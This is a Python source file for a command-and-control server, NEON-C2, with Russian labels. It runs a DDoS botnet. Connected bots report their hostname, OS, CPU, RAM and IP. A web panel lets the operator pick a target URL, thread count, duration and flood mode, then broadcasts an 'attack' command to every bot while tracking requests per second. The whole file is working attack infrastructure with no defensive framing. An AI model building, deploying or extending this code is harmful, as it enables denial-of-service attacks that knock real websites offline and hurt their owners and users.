#!/usr/bin/env python3
# c2_server.py — headless сервер C2 с веб-панелью для Koyeb

import asyncio
import json
import os
import time
import random
import multiprocessing
from collections import deque

from aiohttp import web
import aiohttp

PORT = int(os.environ.get("PORT", 8000))

class State:
    def __init__(self):
        self.clients = {}
        self.next_id = 1
        self.lock = asyncio.Lock()
        self.server_ws = set()
        self.log_buffer = deque(maxlen=500)
        self.attack = {
            "running": False, "url": "", "threads": 0,
            "duration": 0, "mode": "heavy",
            "start_time": 0, "target_requests": 0,
        }

state = State()

def log(msg, color="info"):
    ts = time.strftime("%H:%M:%S")
    print(f"[{ts}] {msg}", flush=True)
    entry = {"ts": ts, "msg": msg, "color": color}
    state.log_buffer.append(entry)
    for ws in list(state.server_ws):
        asyncio.create_task(_safe_send(ws, {"type": "log", **entry}))

async def _safe_send(ws, obj):
    try:
        await ws.send_json(obj)
    except Exception:
        pass

HTML_PANEL = """<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>neon-c2</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { background:#0a0a0f; color:#e0e0e8; font-family:'Consolas',monospace; padding:16px; font-size:13px; }
h1 { color:#00ff9d; font-size:20px; margin-bottom:4px; letter-spacing:2px; }
.sub { color:#6a6a7a; font-size:11px; margin-bottom:16px; }
.panel { background:#12121a; border:1px solid #2a2a3a; border-radius:6px; padding:12px; margin-bottom:12px; }
.row { display:flex; gap:8px; align-items:center; flex-wrap:wrap; }
.label { color:#6a6a7a; font-size:11px; text-transform:uppercase; }
.stat { display:inline-block; background:#1a1a26; padding:8px 12px; border-radius:4px; margin-right:8px; margin-bottom:6px; }
.stat-num { color:#00ff9d; font-size:16px; font-weight:bold; }
.stat-label { color:#6a6a7a; font-size:10px; }
input[type=text], input[type=number] { background:#1a1a26; border:1px solid #2a2a3a; color:#00ff9d; padding:8px; border-radius:4px; font-family:inherit; font-size:12px; outline:none; }
input:focus { border-color:#00ff9d; }
input.url { width:320px; }
input.num { width:70px; }
select { background:#1a1a26; border:1px solid #2a2a3a; color:#00ff9d; padding:8px; border-radius:4px; font-family:inherit; font-size:12px; }
button { background:#ff2d55; color:#0a0a0f; border:none; padding:10px 20px; font-weight:bold; font-family:inherit; font-size:13px; border-radius:4px; cursor:pointer; }
button:disabled { background:#7a1529; color:#3a3a4a; cursor:not-allowed; }
button.stop { background:#1a1a26; color:#ff2d55; border:1px solid #2a2a3a; }
table { width:100%; border-collapse:collapse; font-size:12px; }
th { color:#6a6a7a; text-align:left; padding:6px 8px; font-size:10px; text-transform:uppercase; border-bottom:1px solid #2a2a3a; }
td { padding:6px 8px; border-bottom:1px solid #1a1a26; }
td.id { color:#00ff9d; font-weight:bold; }
td.os { color:#6a6a7a; }
td.ip { color:#00d4ff; }
td.reqs { color:#b480ff; }
td.status-ready { color:#00ff9d; }
td.status-busy { color:#ffb800; }
.log { background:#0a0a0f; border:1px solid #2a2a3a; padding:8px; max-height:300px; overflow-y:auto; font-size:11px; line-height:1.5; }
.log .ts { color:#6a6a7a; }
.log .info { color:#b480ff; }
.log .ok { color:#00ff9d; }
.log .warn { color:#ffb800; }
.log .error { color:#ff2d55; }
.log .attack { color:#ff2d55; font-weight:bold; }
.progress { background:#1a1a26; height:6px; border-radius:3px; overflow:hidden; margin:8px 0; }
.progress-bar { height:100%; background:#00ff9d; width:0%; transition:width 0.3s; }
</style>
</head>
<body>
<h1>NEON-C2</h1>
<div class="sub">koyeb edition</div>

<div class="panel">
  <div class="row">
    <span class="stat"><div class="stat-num" id="stat-devices">0</div><div class="stat-label">УСТРОЙСТВ</div></span>
    <span class="stat"><div class="stat-num" id="stat-rps">0</div><div class="stat-label">ЗАПР/С</div></span>
    <span class="stat"><div class="stat-num" id="stat-traffic">0</div><div class="stat-label">МБ</div></span>
    <span class="stat"><div class="stat-num" id="stat-elapsed">0с</div><div class="stat-label">ВРЕМЯ</div></span>
  </div>
</div>

<div class="panel">
  <div class="row">
    <input type="text" class="url" id="target" placeholder="https://example.com" value="https://">
    <input type="number" class="num" id="threads" value="200" min="10" max="1000">
    <input type="number" class="num" id="duration" value="120" min="5" max="3600">
    <select id="mode">
      <option value="heavy">жёсткий</option>
      <option value="random">случайный</option>
      <option value="get">GET</option>
      <option value="post">POST</option>
    </select>
    <button id="btn-start">⚡ ЗАПУСТИТЬ</button>
    <button id="btn-stop" class="stop" disabled>СТОП</button>
  </div>
  <div class="progress"><div class="progress-bar" id="progress"></div></div>
</div>

<div class="panel">
  <div class="label" style="margin-bottom:6px">ПОДКЛЮЧЁННЫЕ УСТРОЙСТВА</div>
  <table>
    <thead><tr><th>#</th><th>ИМЯ</th><th>ОС</th><th>ЯДРА</th><th>ОЗУ</th><th>IP</th><th>СТАТУС</th><th>ЗАПР</th></tr></thead>
    <tbody id="devices"></tbody>
  </table>
</div>

<div class="panel">
  <div class="label" style="margin-bottom:6px">ЛОГ</div>
  <div class="log" id="log"></div>
</div>

<script>
const ws_proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
const ws = new WebSocket(ws_proto + '//' + location.host + '/ws/server');
let devices = {};
let attackInfo = {running:false, start_time:0, duration:0};
ws.onclose = () => setTimeout(() => location.reload(), 3000);
ws.onmessage = (ev) => {
  const msg = JSON.parse(ev.data);
  if (msg.type === 'log') appendLog(msg);
  else if (msg.type === 'devices') { devices = msg.devices; renderDevices(); updateStats(); }
  else if (msg.type === 'attack') { attackInfo = msg.data; updateButtons(); }
};
function appendLog(m) {
  const box = document.getElementById('log');
  const line = document.createElement('div');
  line.innerHTML = `<span class="ts">[${m.ts}]</span> <span class="${m.color}">${esc(m.msg)}</span>`;
  box.appendChild(line); box.scrollTop = box.scrollHeight;
  while (box.children.length > 300) box.removeChild(box.firstChild);
}
function esc(s) { return s.replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
function renderDevices() {
  const tb = document.getElementById('devices'); tb.innerHTML = '';
  for (const cid in devices) {
    const d = devices[cid]; const info = d.info||{}; const stats = d.stats||{};
    const name = info.display_name || info.hostname || '?';
    const os = info.os || '?'; const cpu = info.cpu || '?';
    const ram = info.ram_mb ? info.ram_mb + 'МБ' : '?';
    const ip = d.ip || '?';
    const busy = d.busy ? 'занят' : 'готов';
    const busyCls = d.busy ? 'status-busy' : 'status-ready';
    const reqs = (stats.requests||0).toLocaleString();
    tb.innerHTML += `<tr><td class="id">#${cid}</td><td>${esc(name.slice(0,24))}</td><td class="os">${esc(os.slice(0,20))}</td><td>${cpu}</td><td>${ram}</td><td class="ip">${ip}</td><td class="${busyCls}">${busy}</td><td class="reqs">${reqs}</td></tr>`;
  }
}
function updateStats() {
  document.getElementById('stat-devices').textContent = Object.keys(devices).length;
  let totalReqs = 0, totalBytes = 0;
  for (const cid in devices) {
    const s = devices[cid].stats||{};
    totalReqs += s.requests||0; totalBytes += s.bytes||0;
  }
  document.getElementById('stat-traffic').textContent = (totalBytes/1024/1024).toFixed(1);
  if (attackInfo.running && attackInfo.start_time) {
    const elapsed = (Date.now()/1000) - attackInfo.start_time;
    const rps = elapsed > 0 ? totalReqs/elapsed : 0;
    document.getElementById('stat-rps').textContent = Math.round(rps);
    document.getElementById('stat-elapsed').textContent = Math.round(elapsed) + 'с';
    document.getElementById('progress').style.width = (Math.min(elapsed/attackInfo.duration,1)*100) + '%';
  } else {
    document.getElementById('stat-rps').textContent = '0';
    document.getElementById('stat-elapsed').textContent = '0с';
    document.getElementById('progress').style.width = '0%';
  }
}
function updateButtons() {
  document.getElementById('btn-start').disabled = attackInfo.running;
  document.getElementById('btn-stop').disabled = !attackInfo.running;
}
document.getElementById('btn-start').onclick = () => {
  const url = document.getElementById('target').value.trim();
  const threads = parseInt(document.getElementById('threads').value);
  const duration = parseInt(document.getElementById('duration').value);
  const mode = document.getElementById('mode').value;
  if (!url || !url.startsWith('http')) { alert('введи полный URL'); return; }
  ws.send(JSON.stringify({cmd:'start', url, threads, duration, mode}));
};
document.getElementById('btn-stop').onclick = () => ws.send(JSON.stringify({cmd:'stop'}));
setInterval(updateStats, 500); setInterval(updateButtons, 500);
</script>
</body>
</html>
"""

async def handle_panel(request):
    return web.Response(text=HTML_PANEL, content_type="text/html")

async def handle_server_ws(request):
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    state.server_ws.add(ws)
    log("панель подключилась", "ok")
    try:
        await ws.send_json({"type": "devices", "devices": _serialize_devices()})
        await ws.send_json({"type": "attack", "data": state.attack})
        async for msg in ws:
            if msg.type == aiohttp.WSMsgType.TEXT:
                try:
                    data = json.loads(msg.data)
                    await _handle_panel_cmd(data)
                except Exception as e:
                    log(f"ошибка команды: {e}", "error")
    finally:
        state.server_ws.discard(ws)
        log("панель отключилась", "warn")
    return ws

async def _handle_panel_cmd(data):
    cmd = data.get("cmd")
    if cmd == "start":
        if not state.clients:
            log("нет устройств", "error"); return
        url = data.get("url")
        threads = int(data.get("threads", 200))
        duration = int(data.get("duration", 120))
        mode = data.get("mode", "heavy")
        msg = {"cmd": "attack", "url": url, "threads": threads, "duration": duration, "mode": mode}
        sent = await _broadcast_to_clients(msg)
        state.attack = {"running": True, "url": url, "threads": threads,
                        "duration": duration, "mode": mode,
                        "start_time": time.time(), "target_requests": 0}
        log(f"АТАКА на {url} | потоки {threads} | {duration}с | уст. {sent}", "attack")
        await _broadcast_to_panels({"type": "attack", "data": state.attack})
    elif cmd == "stop":
        await _broadcast_to_clients({"cmd": "stop"})
        state.attack["running"] = False
        log("атака остановлена", "warn")
        await _broadcast_to_panels({"type": "attack", "data": state.attack})

def _serialize_devices():
    out = {}
    for cid, c in state.clients.items():
        out[str(cid)] = {"info": c["info"], "stats": c["stats"],
                         "ip": c.get("ip", "?"), "busy": c.get("busy", False),
                         "connected_at": c["connected_at"]}
    return out

async def _broadcast_to_clients(obj):
    sent = 0
    for cid, c in list(state.clients.items()):
        try:
            await c["ws"].send_json(obj); sent += 1
        except Exception: pass
    return sent

async def _broadcast_to_panels(obj):
    for ws in list(state.server_ws):
        try: await ws.send_json(obj)
        except Exception: state.server_ws.discard(ws)

async def handle_client_ws(request):
    ws = web.WebSocketResponse(heartbeat=30)
    await ws.prepare(request)
    peer_ip = request.remote or "?"
    try:
        hello_msg = await asyncio.wait_for(ws.receive_json(), timeout=15)
    except Exception:
        await ws.close(); return ws
    if hello_msg.get("cmd") != "hello":
        await ws.close(); return ws
    async with state.lock:
        cid = state.next_id
        state.next_id += 1
        state.clients[cid] = {"ws": ws, "info": hello_msg, "stats": {},
                              "ip": peer_ip, "busy": False,
                              "connected_at": time.time()}
    name = hello_msg.get("display_name") or hello_msg.get("hostname") or "?"
    os_str = hello_msg.get("os") or "?"
    cpu = hello_msg.get("cpu", "?")
    ram = hello_msg.get("ram_mb", 0)
    log(f"устройство #{cid} подключилось [{peer_ip}]", "ok")
    log(f"  → {name} | {os_str} | {cpu} ядер | {ram}МБ", "info")
    try: await ws.send_json({"cmd": "hello", "id": cid})
    except Exception: pass
    await _broadcast_to_panels({"type": "devices", "devices": _serialize_devices()})
    try:
        async for msg in ws:
            if msg.type == aiohttp.WSMsgType.TEXT:
                try:
                    data = json.loads(msg.data)
                    await _handle_client_msg(cid, data)
                except Exception: pass
    finally:
        async with state.lock:
            state.clients.pop(cid, None)
        log(f"устройство #{cid} отключилось", "warn")
        await _broadcast_to_panels({"type": "devices", "devices": _serialize_devices()})
    return ws

async def _handle_client_msg(cid, data):
    c = data.get("cmd")
    if cid not in state.clients: return
    client = state.clients[cid]
    if c == "ready":
        client["busy"] = False
    elif c == "stats":
        client["stats"] = data.get("stats", {})
        await _broadcast_to_panels({"type": "devices", "devices": _serialize_devices()})
    elif c == "ping":
        try: await client["ws"].send_json({"cmd": "pong"})
        except Exception: pass
    elif c == "log":
        level = data.get("level", "info")
        text = data.get("msg", "")
        log(f"[уст. #{cid}] {text}", level)

async def periodic_checker():
    while True:
        await asyncio.sleep(2)
        if state.attack["running"] and state.attack["start_time"]:
            elapsed = time.time() - state.attack["start_time"]
            if elapsed >= state.attack["duration"]:
                await _broadcast_to_clients({"cmd": "stop"})
                state.attack["running"] = False
                log(f"атака завершена ({int(elapsed)}с)", "ok")
                await _broadcast_to_panels({"type": "attack", "data": state.attack})

async def main():
    app = web.Application()
    app.router.add_get("/", handle_panel)
    app.router.add_get("/ws/server", handle_server_ws)
    app.router.add_get("/ws/client", handle_client_ws)
    asyncio.create_task(periodic_checker())
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    log(f"neon-c2 запущен на порту {PORT}", "ok")
    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("shutdown")